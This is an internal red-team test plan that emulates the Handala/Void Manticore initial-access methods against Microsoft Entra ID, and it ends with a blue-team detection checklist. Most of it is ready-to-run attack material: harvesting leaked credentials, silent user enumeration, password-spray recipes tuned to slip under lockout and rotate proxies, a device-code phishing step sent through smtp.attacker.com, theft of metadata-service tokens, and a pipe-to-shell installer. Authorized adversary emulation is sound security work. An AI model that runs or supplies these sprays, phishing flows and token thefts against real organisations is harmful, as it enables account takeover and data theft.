# External Reconnaissance & Initial Access Test Plan

## Handala/Void Manticore TTP Emulation — Phase 1: Outside-In

**Classification:** Internal — Authorized Testing Only
**Version:** 1.0 | March 2026
**Scope:** External OSINT, exposed credential/token discovery, Entra ID tenant enumeration, initial access vectors

-----

## 1. Objective

Validate the organization’s external attack surface against the initial access methods used by Handala/Void Manticore. This actor consistently gains entry through **compromised VPN credentials**, **brute-force/spray attacks**, and **supply-chain credential theft from IT providers**. The Stryker incident specifically began with admin credential compromise leading to Entra ID/Intune takeover. This plan focuses exclusively on what an external attacker can discover and exploit before touching internal infrastructure.

-----

## 2. Phase Map

```
Phase 1: Passive OSINT & Tenant Fingerprinting          [No auth, no direct interaction]
Phase 2: Exposed Credential & Token Harvesting           [Public sources, no target interaction]
Phase 3: Active Entra ID Enumeration                     [Unauthenticated API interaction]
Phase 4: Credential Validation & Spray                   [Authenticated attempts]
Phase 5: Initial Access Exploitation                     [Token abuse, phishing, device code]
```

-----

## 3. Phase 1 — Passive OSINT & Tenant Fingerprinting

### 3.1 Tenant Discovery & Domain Mapping

**Goal:** Map all Entra ID tenant domains, federation config, SSO settings, and identity infrastructure without any authenticated interaction.

#### Tool: AADInternals (PowerShell)

```powershell
# Install
Install-Module AADInternals -Scope CurrentUser -Force
Import-Module AADInternals

# Full outsider recon — returns ALL verified domains, tenant ID, federation config,
# SSO status, MDI instance, MX/SPF/DMARC
Invoke-AADIntReconAsOutsider -DomainName "target.com" | Format-Table

# Online version (no install): https://aadinternals.com/osint
```

**What this reveals (unauthenticated):**

- Tenant ID and tenant name (*.onmicrosoft.com)
- All verified domain names (critical for M&A discovery — Stryker had OrthoSpace domains)
- Per-domain auth type: Managed vs. Federated
- Federated IdP FQDN (exposes ADFS servers)
- Seamless SSO status (enables user enumeration if enabled)
- Microsoft Defender for Identity (MDI) instance existence
- MX/SPF/DMARC configuration per domain

#### Tool: Direct API Queries (No Tooling Required)

```bash
# Tenant ID from OpenID config
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq '.issuer'

# User realm discovery — reveals NameSpaceType (Managed/Federated), federation metadata
curl -s "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Tenant region
curl -s "https://login.microsoftonline.com/target.com/.well-known/openid-configuration" | jq '.tenant_region_scope'
```

#### Tool: ATEAM (NetSPI) — Azure Resource Attribution

```bash
# Maps Azure resources back to tenant via auth redirect fingerprinting
# Discovers blob storage, app services, key vaults, etc. tied to tenant
git clone https://github.com/NetSPI/ATEAM.git
# Follow ATEAM enumeration workflow for subdomain → tenant attribution
```

#### Tool: MicroBurst — Azure Subdomain Enumeration

```powershell
Import-Module .\MicroBurst.psm1 -Verbose

# Enumerate Azure subdomains — blobs, app services, vaults, DBs
Invoke-EnumerateAzureSubDomains -Base "target" -Verbose

# Specific service enumeration
Invoke-EnumerateAzureBlobs -Base "target"
```

**Output Artifact:** `target-tenant-recon.json` — Tenant ID, all domains, auth types, federation endpoints, Azure resource inventory.

#### OPSEC Note for Blue Team

All of the above is **completely silent** — no sign-in logs, no alerts, no tenant-side visibility. These are unauthenticated public API queries. There is nothing to detect here.

-----

### 3.2 ADFS / Federation Endpoint Discovery

If AADInternals reveals federated domains, the ADFS server becomes a high-value target.

```bash
# ADFS metadata endpoint (public by default)
curl -s "https://adfs.target.com/adfs/ls/idpinitiatedsignon.aspx"
curl -s "https://adfs.target.com/federationmetadata/2007-06/federationmetadata.xml"

# Check for ADFS extranet lockout config via timing analysis
# Spray against ADFS usernamemixed endpoint (bypasses Entra smart lockout)
# Endpoint: /adfs/services/trust/2005/usernamemixed
```

**Why this matters:** ADFS authentication bypasses Entra ID Smart Lockout. Password spray against ADFS is a well-known gap. Handala targets VPN and federation endpoints specifically.

-----

### 3.3 DNS & Infrastructure Recon

```bash
# Subdomain enumeration
subfinder -d target.com -silent -o target-subdomains.txt
amass enum -passive -d target.com -o target-amass.txt

# Identify VPN endpoints (Handala's primary entry vector)
cat target-subdomains.txt | grep -iE "vpn|remote|gateway|sslvpn|access|portal|citrix|pulse|fortinet|globalprotect"

# Certificate transparency log mining
# Reveals internal hostnames, dev/staging environments, acquisition domains
curl -s "https://crt.sh/?q=%.target.com&output=json" | jq '.[].name_value' | sort -u

# ADFS / identity provider infrastructure
cat target-subdomains.txt | grep -iE "adfs|sts|sso|login|auth|okta|ping|idp"

# Shodan / Censys for exposed management interfaces
shodan search "ssl.cert.subject.cn:target.com" --fields ip_str,port,product
censys search "services.tls.certificates.leaf.names: target.com"
```

**Key Targets (Handala-Specific):**

- VPN concentrators (Pulse Secure, Fortinet, GlobalProtect, Cisco AnyConnect)
- ADFS servers exposed to internet
- Exchange OWA/ECP endpoints
- Citrix/RDP gateways
- Any web application with SSO integration

-----

### 3.4 Employee & Org Structure OSINT

```bash
# LinkedIn enumeration for username pattern derivation
# Tools: linkedin2username, CrossLinked
python3 crosslinked.py -f '{first}.{last}@target.com' "Target Corporation"
python3 crosslinked.py -f '{f}{last}@target.com' "Target Corporation"

# Generate username lists from multiple patterns
# first.last, flast, firstl, first_last
# Target: IT admins, Identity/IAM team, Intune admins, helpdesk, Global Admins

# Dehashed / breach data correlation (requires API key)
# Search for target.com domain in breach databases
# Prioritize: admin@, svc-, it-, helpdesk@, intune-, azure-
```

**Handala Relevance:** The actor targets IT/MSP providers for supply chain credential access. Map the organization’s IT service providers and check their breach exposure too.

-----

## 4. Phase 2 — Exposed Credential & Token Harvesting

### 4.1 GitHub / Public Code Repository Scanning

This is the highest-ROI activity. Developers routinely leak Azure/Entra credentials, SAS tokens, connection strings, and service principal secrets in public repos.

#### Tool: TruffleHog

```bash
# Install
pip install trufflehog --break-system-packages
# OR
curl -sSfL https://raw.githubusercontent.com/trufflesecurity/trufflehog/main/scripts/install.sh | sh -s -- -b /usr/local/bin

# Scan target's GitHub org — full history, all branches, verified results only
trufflehog github --org="TargetCorp" --results=verified --json > target-trufflehog.json

# Scan specific repos
trufflehog github --repo="https://github.com/TargetCorp/internal-tools" --results=verified

# Scan individual developer repos (from LinkedIn OSINT)
trufflehog github --repo="https://github.com/developer-username/dotfiles" --results=verified

# Critical: Scan git history including deleted/force-pushed commits
trufflehog git https://github.com/TargetCorp/repo.git --all-branches --results=verified,unknown

# Docker image scanning (if target publishes containers)
trufflehog docker --image="targetcorp/appname:latest" --results=verified
```

**What to look for (Azure/Entra-specific):**

- `AZURE_CLIENT_SECRET` / `AZURE_TENANT_ID` / `AZURE_CLIENT_ID` triplets
- Service principal credentials in CI/CD configs (.github/workflows/, .gitlab-ci.yml)
- SAS tokens (`?sv=...&sig=...`)
- Connection strings (`DefaultEndpointsProtocol=https;AccountName=...;AccountKey=...`)
- `az login` commands with embedded credentials
- `.env` files with `MICROSOFT_GRAPH_*` variables
- Intune/Graph API tokens or app registration secrets

#### Tool: Gitleaks

```bash
# Fast, lightweight alternative — good for CI-style scanning
gitleaks detect --source="https://github.com/TargetCorp/repo" --report-format=json --report-path=gitleaks-report.json

# Custom config for Azure-specific secrets
gitleaks detect --source=. --config=azure-custom.toml
```

#### Tool: GitHub Dorking (Manual)

```
# GitHub search queries — run against github.com/search
"target.com" password
"target.com" secret
"target.com" AZURE_CLIENT_SECRET
"target.com" connectionstring
org:TargetCorp filename:.env
org:TargetCorp filename:appsettings.json
org:TargetCorp "DefaultEndpointsProtocol"
org:TargetCorp "SharedAccessSignature"
org:TargetCorp "client_secret"
org:TargetCorp filename:terraform.tfstate
org:TargetCorp filename:.tfvars
org:TargetCorp path:.github/workflows "AZURE"
"target.onmicrosoft.com" password OR secret OR key
```

### 4.2 Paste Sites & Breach Databases

```bash
# Search paste sites
# dehashed.com — query target.com domain for breached credentials
# haveibeenpwned.com/DomainSearch — domain-level breach exposure
# intelx.io — search for target.com across paste sites, dark web, public leaks
# leakcheck.io — credential verification against breach databases

# Automate with h8mail
pip install h8mail --break-system-packages
h8mail -t "target.com" --config h8mail_config.ini

# Prioritize results:
# - Any admin/IT/helpdesk accounts
# - Accounts matching Entra admin naming patterns
# - Passwords that could be reused across VPN/Entra
# - Service accounts (svc-*, app-*, intune-*)
```

### 4.3 Cloud Storage Exposure

```bash
# Azure Blob Storage — check for public containers
# Common patterns: backup, logs, data, export, migration, dev
python3 -c "
import requests
bases = ['target', 'targetcorp', 'target-backup', 'target-dev', 'targetdata']
containers = ['backup', 'data', 'logs', 'export', 'public', 'uploads', 'config', 'migration']
for b in bases:
    for c in containers:
        url = f'https://{b}.blob.core.windows.net/{c}?restype=container&comp=list'
        r = requests.get(url)
        if r.status_code == 200:
            print(f'[PUBLIC] {url}')
        elif r.status_code == 404:
            pass  # container doesn't exist
        else:
            print(f'[{r.status_code}] {url}')
"

# S3 / GCS equivalent checks if multi-cloud
# Look for exported Intune configs, Entra exports, AD backups in public storage
```

### 4.4 Certificate Transparency & Domain Intelligence

```bash
# Search for leaked internal hostnames, dev environments
# Tools: crt.sh, certspotter, CT log aggregators

# Google dorking for exposed configuration
site:target.com filetype:xml "password"
site:target.com filetype:config "connectionstring"
site:target.com intitle:"index of" ".env"
site:pastebin.com "target.com" password
```

-----

## 5. Phase 3 — Active Entra ID Enumeration

### 5.1 User Enumeration

Three methods with different stealth profiles:

|Method                  |Tool                   |Logged in Entra?|Rate Limited?|Stealth |
|------------------------|-----------------------|----------------|-------------|--------|
|GetCredentialType API   |AADInternals, o365spray|No (standard)   |Yes, moderate|Medium  |
|Autologon (Seamless SSO)|AADInternals           |**No**          |Light        |**High**|
|OneDrive probing        |onedrive_user_enum     |**No**          |Light        |**High**|
|Login attempt           |o365spray, MSOLSpray   |**Yes**         |Yes          |Low     |

#### Method A: AADInternals Autologon (Stealthiest)

```powershell
# Requires Seamless SSO to be enabled (check in Phase 1 recon)
# Zero sign-in log entries — completely undetectable to target

Get-Content .\userlist.txt | Invoke-AADIntUserEnumerationAsOutsider -Method Autologon

# Output:
# UserName              Exists
# --------              ------
# admin@target.com      True
# svc-intune@target.com True
# john.doe@target.com   True
# fake.user@target.com  False
```

#### Method B: OneDrive Enumeration (nyxgeek)

```bash
# Probes default OneDrive URLs — no sign-in logs generated
# https://github.com/nyxgeek/onedrive_user_enum
python3 onedrive_user_enum.py -d target.com -U userlist.txt

# OneDrive URL pattern:
# https://target-my.sharepoint.com/personal/firstname_lastname_target_com/
# 302 = exists, 404 = doesn't exist
```

#### Method C: o365spray (Python, multi-method)

```bash
# Enumerate valid users
python3 o365spray.py --enum -d target.com \
    -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-compat.txt \
    --rate 1

# Use output for spray phase
```

#### Username List Generation Strategy

```bash
# Combine sources:
# 1. CrossLinked output (LinkedIn → email format)
# 2. Common admin patterns
# 3. Breach database usernames for target.com domain
# 4. Standard service account names

# Generate targeted admin/service account list:
cat << 'EOF' > admin-targets.txt
admin@target.com
administrator@target.com
it-admin@target.com
helpdesk@target.com
svc-intune@target.com
svc-azure@target.com
svc-graph@target.com
intune-admin@target.com
azureadmin@target.com
globaladmin@target.com
breakglass@target.com
emergency@target.com
sync_account@target.com
MSOL_xxxxxxxxxx@target.com
svc-entraconnect@target.com
noreply@target.com
scanner@target.com
service@target.com
backup@target.com
EOF

# Merge with employee-derived usernames
cat crosslinked-output.txt admin-targets.txt | sort -u > full-userlist.txt
```

### 5.2 Authentication Method Fingerprinting

```powershell
# Per-user credential type check — reveals MFA config, auth methods
# POST https://login.microsoftonline.com/common/GetCredentialType

$body = @{
    username = "admin@target.com"
    isOtherIdpSupported = $true
    checkPhones = $true
    isRemoteNGCSupported = $true
    isCookieBannerShown = $false
    isFidoSupported = $true
    isAccessPassSupported = $true
} | ConvertTo-Json

$response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/GetCredentialType" `
    -Method POST -Body $body -ContentType "application/json"

# Key response fields:
# IfExistsResult: 0 = exists, 1 = doesn't exist
# Credentials.PrefCredential: 1 = password, 6 = FIDO2, 4 = phone
# Credentials.HasPassword: true/false
# ThrottleStatus: 0 = not throttled, 1 = throttled
# EstsProperties.DesktopSsoEnabled: true if Seamless SSO
```

**What this tells you:**

- Whether the account exists (user enumeration)
- What auth methods are configured (password, FIDO2, phone, authenticator app)
- Whether the account has a password at all (password-less accounts are spray-resistant)
- Whether Seamless SSO / Desktop SSO is enabled
- Federation redirect URLs for federated accounts

-----

## 6. Phase 4 — Credential Validation & Password Spray

### 6.1 Password Spray Against Entra ID

#### Tool: MSOLSpray

```powershell
# Classic Entra ID password spray
# Respects lockout: Entra default = 10 failures → 60 second lockout
Import-Module .\MSOLSpray.ps1

Invoke-MSOLSpray -UserList .\valid-users.txt -Password "Spring2026!" -Verbose
Invoke-MSOLSpray -UserList .\valid-users.txt -Password "Target2026!" -Verbose
Invoke-MSOLSpray -UserList .\valid-users.txt -Password "Welcome1!" -Verbose
```

#### Tool: o365spray (with throttling)

```bash
# Spray with rate limiting
python3 o365spray.py --spray -d target.com \
    -U valid-users.txt \
    -P passwords.txt \
    --rate 1 \
    --lockout 30 \
    --safe 10
```

#### Tool: TREVORspray (distributed spray via SOCKS proxies)

```bash
# Distributes spray across multiple source IPs — mimics Handala's VPN rotation
pip install trevorspray --break-system-packages

trevorspray -u valid-users.txt -p 'Spring2026!' \
    --url https://login.microsoftonline.com \
    --proxy socks5://proxy1:1080 socks5://proxy2:1080 \
    --delay 30 \
    --jitter 10
```

#### Spray Strategy (Handala-Aligned)

```
Password candidates (org-specific):
- Season+Year+!     (Spring2026!, Winter2026!)
- CompanyName+Year  (Target2026!, Stryker2026!)
- Welcome+digits    (Welcome1!, Welcome123!)
- P@ssw0rd variants
- Month+Year        (March2026!, January2026!)

Timing:
- 1 password per user per 30-60 min cycle
- Max 3-5 passwords per day to stay under lockout
- Rotate source IPs between cycles
- Avoid spraying during peak business hours (noisier in SIEM)
```

#### ADFS Spray (Bypasses Entra Smart Lockout)

```bash
# If ADFS is federated, spray against /adfs/services/trust/2005/usernamemixed
# This does NOT trigger Entra ID lockout — only ADFS extranet lockout (if configured)

# Tool: ADFSpray
python3 adfspray.py -u valid-users.txt -p 'Spring2026!' \
    --adfs-url https://adfs.target.com/adfs/services/trust/2005/usernamemixed
```

**Detection Surface (for Blue Team):**

- Entra ID Sign-in logs: failed authentication events
- Smart Lockout triggers
- Conditional Access blocks (location, device compliance)
- ADFS extranet lockout events (Event ID 411 in ADFS logs)
- SIEM correlation for distributed low-frequency spray patterns

### 6.2 Credential Stuffing from Breach Data

```bash
# Match breach credentials against valid Entra accounts
# Use dehashed/intelx results from Phase 2

# For each breached credential pair:
# 1. Test against Entra ID login
# 2. Test against VPN portal
# 3. Test against OWA/ECP
# 4. Test against ADFS

# Password reuse across personal → corporate is the most common vector
# Handala specifically uses "compromised VPN accounts for initial access"
```

-----

## 7. Phase 5 — Initial Access Exploitation

### 7.1 Validated Credential Exploitation

Once a valid credential pair is obtained:

```bash
# Test what we can access with the compromised account

# Azure CLI authentication
az login -u "user@target.com" -p "password" --allow-no-subscriptions

# Check for MFA challenge — if none, full access
# If MFA, move to 7.2 (MFA bypass) or 7.3 (device code phishing)

# Graph API access test
TOKEN=$(curl -s -X POST "https://login.microsoftonline.com/target.com/oauth2/v2.0/token" \
    -d "grant_type=password&client_id=1950a258-227b-4e31-a9cf-717495945fc2&scope=https://graph.microsoft.com/.default&username=user@target.com&password=PASSWORD" \
    | jq -r '.access_token')

# If token returned — check what resources are accessible
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me"
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/me/memberOf"

# Check for Intune admin roles
curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/directoryRoles" | jq '.value[].displayName'
```

### 7.2 Device Code Phishing (AADInternals)

If MFA blocks direct password auth, device code flow is the Handala-relevant bypass:

```powershell
# Generate device code phishing link
# This creates a legitimate Microsoft device code auth flow
# Victim enters code at https://microsoft.com/devicelogin

$token = Get-AADIntAccessTokenForAzureCoreManagement -DeviceCode

# Send phishing email with device code
# Template: "Your account requires re-verification. Visit https://microsoft.com/devicelogin and enter code: XXXXXXXX"

# If victim completes flow, you get their access + refresh tokens
# This bypasses MFA because the victim authenticates on their device

# Automated phishing delivery
Send-AADIntPhishingEmail -Recipient "admin@target.com" -Subject "Action Required: Security Verification" `
    -Sender "security@target.com" -SMTPServer smtp.attacker.com
```

**Why this matters:** Device code phishing is explicitly called out in AADInternals documentation as a zero-infrastructure phishing method. It generates a legitimate Microsoft login flow — no spoofed pages needed.

### 7.3 Exposed Service Principal Exploitation

If Phase 2 uncovered leaked app registration credentials:

```bash
# Authenticate as service principal
az login --service-principal \
    --username "APP_CLIENT_ID" \
    --password "APP_CLIENT_SECRET" \
    --tenant "TENANT_ID"

# Check permissions
az ad app permission list --id "APP_CLIENT_ID"

# If DeviceManagementConfiguration.ReadWrite.All is present → Intune admin access
# If Directory.ReadWrite.All → full Entra directory control
# If Mail.ReadWrite → mailbox access across org

# GraphRunner for post-auth enumeration
Import-Module .\GraphRunner.ps1
# Enumerate accessible resources via compromised service principal
```

### 7.4 Token Theft from Exposed Infrastructure

```bash
# Check for exposed Azure App Service with managed identity
# If Kudu/SCM console is accessible:
curl -s "https://target-app.scm.azurewebsites.net/api/environment"

# Managed identity token theft
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
    -H "Metadata: true"

# Azure Instance Metadata Service (IMDS) — if any Azure VM is reachable
curl -s "http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
```

-----

## 8. Automation Wrapper Script

```bash
#!/bin/bash
# external-recon-runner.sh
# Orchestrates Phase 1-3 automated reconnaissance
# Usage: ./external-recon-runner.sh target.com

TARGET_DOMAIN="$1"
OUTPUT_DIR="./recon-${TARGET_DOMAIN}-$(date +%Y%m%d)"
mkdir -p "$OUTPUT_DIR"

echo "[*] Phase 1: Passive Recon — $TARGET_DOMAIN"

# Tenant fingerprint
echo "[+] Entra ID tenant discovery..."
curl -s "https://login.microsoftonline.com/${TARGET_DOMAIN}/.well-known/openid-configuration" \
    | jq '.' > "$OUTPUT_DIR/openid-config.json"
TENANT_ID=$(jq -r '.issuer | split("/")[-2]' "$OUTPUT_DIR/openid-config.json")
echo "[+] Tenant ID: $TENANT_ID"

# Subdomain enumeration
echo "[+] Subdomain enumeration..."
subfinder -d "$TARGET_DOMAIN" -silent -o "$OUTPUT_DIR/subdomains.txt" 2>/dev/null
echo "[+] Found $(wc -l < "$OUTPUT_DIR/subdomains.txt") subdomains"

# CT log mining
echo "[+] Certificate transparency..."
curl -s "https://crt.sh/?q=%.${TARGET_DOMAIN}&output=json" \
    | jq -r '.[].name_value' | sort -u > "$OUTPUT_DIR/ct-domains.txt" 2>/dev/null

# VPN endpoint identification
echo "[+] Identifying VPN/remote access endpoints..."
cat "$OUTPUT_DIR/subdomains.txt" "$OUTPUT_DIR/ct-domains.txt" 2>/dev/null \
    | sort -u \
    | grep -iE "vpn|remote|gateway|ssl|access|portal|citrix|pulse|forti|globalprotect|anyconnect" \
    > "$OUTPUT_DIR/vpn-endpoints.txt"
echo "[+] Found $(wc -l < "$OUTPUT_DIR/vpn-endpoints.txt") potential VPN endpoints"

# Identity infrastructure
echo "[+] Identifying identity infrastructure..."
cat "$OUTPUT_DIR/subdomains.txt" "$OUTPUT_DIR/ct-domains.txt" 2>/dev/null \
    | sort -u \
    | grep -iE "adfs|sts|sso|login|auth|idp|okta|ping|saml" \
    > "$OUTPUT_DIR/identity-endpoints.txt"

echo "[*] Phase 2: Credential Harvesting"

# GitHub org scanning
echo "[+] TruffleHog GitHub scan (if org exists)..."
trufflehog github --org="${TARGET_DOMAIN%%.*}" --results=verified --json \
    > "$OUTPUT_DIR/trufflehog-github.json" 2>/dev/null

# GitHub dorking (manual follow-up needed)
echo "[+] GitHub dork queries saved..."
cat << EOF > "$OUTPUT_DIR/github-dorks.txt"
"${TARGET_DOMAIN}" password
"${TARGET_DOMAIN}" secret
"${TARGET_DOMAIN}" AZURE_CLIENT_SECRET
"${TARGET_DOMAIN}" connectionstring
org:${TARGET_DOMAIN%%.*} filename:.env
org:${TARGET_DOMAIN%%.*} filename:appsettings.json
org:${TARGET_DOMAIN%%.*} "DefaultEndpointsProtocol"
org:${TARGET_DOMAIN%%.*} path:.github/workflows "AZURE"
"${TARGET_DOMAIN%%.*}.onmicrosoft.com" password OR secret
EOF

# Azure blob storage enumeration
echo "[+] Checking public blob storage..."
BASE="${TARGET_DOMAIN%%.*}"
for STORAGE in "$BASE" "${BASE}corp" "${BASE}data" "${BASE}backup" "${BASE}dev"; do
    for CONTAINER in backup data logs export public uploads config; do
        URL="https://${STORAGE}.blob.core.windows.net/${CONTAINER}?restype=container&comp=list"
        STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
        if [ "$STATUS" = "200" ]; then
            echo "[!] PUBLIC BLOB: $URL" | tee -a "$OUTPUT_DIR/public-blobs.txt"
        fi
    done
done

echo "[*] Phase 3: User Enumeration (requires valid format)"
echo "[!] Run AADInternals or o365spray manually with generated username lists"
echo "[+] Output directory: $OUTPUT_DIR"
echo "[*] Done."
```

-----

## 9. Tool Summary Matrix

|Tool                  |Purpose                                      |Stealth                |Install                      |
|----------------------|---------------------------------------------|-----------------------|-----------------------------|
|**AADInternals**      |Tenant recon, user enum, device code phishing|High (Autologon method)|`Install-Module AADInternals`|
|**o365spray**         |User enum + password spray                   |Medium                 |`pip install o365spray`      |
|**MSOLSpray**         |Entra ID password spray                      |Low (logged)           |PowerShell module            |
|**TREVORspray**       |Distributed spray via SOCKS                  |Medium-High            |`pip install trevorspray`    |
|**TruffleHog**        |Secret scanning (GitHub, Docker, S3)         |N/A (passive)          |`pip install trufflehog`     |
|**Gitleaks**          |Fast secret scanning                         |N/A (passive)          |Go binary                    |
|**MicroBurst**        |Azure subdomain/resource enum                |High                   |PowerShell module            |
|**ATEAM**             |Azure resource → tenant attribution          |High                   |Python                       |
|**CrossLinked**       |LinkedIn → username generation               |N/A (passive)          |`pip install crosslinked`    |
|**onedrive_user_enum**|User enum via OneDrive URLs                  |High (no logs)         |Python                       |
|**subfinder**         |Subdomain discovery                          |N/A (passive)          |Go binary                    |
|**GraphRunner**       |Post-auth Graph API enumeration              |N/A (post-auth)        |PowerShell                   |
|**ROADtools**         |Entra ID data collection via Graph           |N/A (post-auth)        |`pip install roadtools`      |
|**ADFSpray**          |ADFS-specific password spray                 |Medium                 |Python                       |
|**h8mail**            |Breach database aggregation                  |N/A (passive)          |`pip install h8mail`         |

-----

## 10. Decision Tree: OSINT → Initial Access

```
START
  │
  ├─ Tenant Recon (AADInternals)
  │    ├─ Federated domains found?
  │    │    └─ YES → Target ADFS server (ADFSpray, bypasses Smart Lockout)
  │    │    └─ NO  → Target Entra directly (MSOLSpray, o365spray)
  │    ├─ Seamless SSO enabled?
  │    │    └─ YES → Silent user enum via Autologon method
  │    │    └─ NO  → GetCredentialType or OneDrive enum
  │    └─ MDI instance detected?
  │         └─ YES → Expect credential theft detection (plan accordingly)
  │
  ├─ Credential Harvesting (TruffleHog, breaches)
  │    ├─ Service principal creds found?
  │    │    └─ YES → Direct API auth → Check Graph permissions → Intune access?
  │    ├─ User passwords found in breaches?
  │    │    └─ YES → Credential stuffing against Entra + VPN + ADFS
  │    ├─ SAS tokens / storage keys found?
  │    │    └─ YES → Direct Azure storage access → config files → more creds
  │    └─ Nothing found?
  │         └─ Move to spray
  │
  ├─ Password Spray
  │    ├─ Account + password validated?
  │    │    ├─ MFA enforced?
  │    │    │    ├─ YES → Device code phishing (AADInternals)
  │    │    │    │        OR AiTM phishing (Evilginx)
  │    │    │    │        OR check for legacy auth protocols (IMAP/POP/SMTP basic auth)
  │    │    │    └─ NO  → Direct login → enumerate → escalate
  │    │    └─ Conditional Access blocking?
  │    │         └─ Try from compliant device / trusted IP / different user agent
  │    └─ All sprays failed?
  │         └─ Pivot to supply chain (target IT/MSP providers — Handala's preferred vector)
  │
  └─ INITIAL ACCESS ACHIEVED
       └─ Proceed to Phase 2 plan (internal recon, Entra admin escalation, Intune abuse)
```

-----

## 11. Detection Validation Checklist (Blue Team)

For each phase, verify whether your defenses detected the activity:

| Activity                               | Expected Detection                 | Alert Fired? |
| -------------------------------------- | ---------------------------------- | ------------ |
| Tenant recon via OpenID/UserRealm APIs | None (by design)                   | N/A          |
| User enum via Autologon                | None (by design)                   | N/A          |
| User enum via GetCredentialType        | Possible throttle only             | ☐            |
| User enum via login attempts           | Sign-in logs (failed)              | ☐            |
| Password spray (Entra)                 | Smart Lockout, Identity Protection | ☐            |
| Password spray (ADFS)                  | ADFS Extranet Lockout (Event 411)  | ☐            |
| Credential stuffing (valid creds)      | Risk-based CA, anomalous sign-in   | ☐            |
| Device code phishing completion        | Sign-in log (device code grant)    | ☐            |
| Service principal auth from new IP     | Service principal risk detection   | ☐            |
| Legacy protocol auth (IMAP/POP)        | CA policy block for legacy auth    | ☐            |
| Bulk GitHub secret exposure            | N/A (external, your problem)       | ☐            |
